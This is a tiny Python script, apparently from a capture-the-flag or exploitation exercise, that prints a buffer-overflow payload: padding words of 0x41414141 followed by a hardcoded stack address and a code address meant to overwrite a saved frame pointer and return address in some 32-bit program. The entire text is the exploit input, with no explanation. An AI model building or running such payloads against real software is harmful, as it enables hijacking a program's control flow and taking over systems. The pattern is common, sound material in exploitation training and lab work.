from struct import pack
import sys

sys.stdout.buffer.write(pack("<I", 0x41414141))
sys.stdout.buffer.write(pack("<I", 0x41414141))
sys.stdout.buffer.write(pack("<I", 0x41414141))
sys.stdout.buffer.write(pack("<I", 0xffffd128))
sys.stdout.buffer.write(pack("<I", 0x08049dc9))

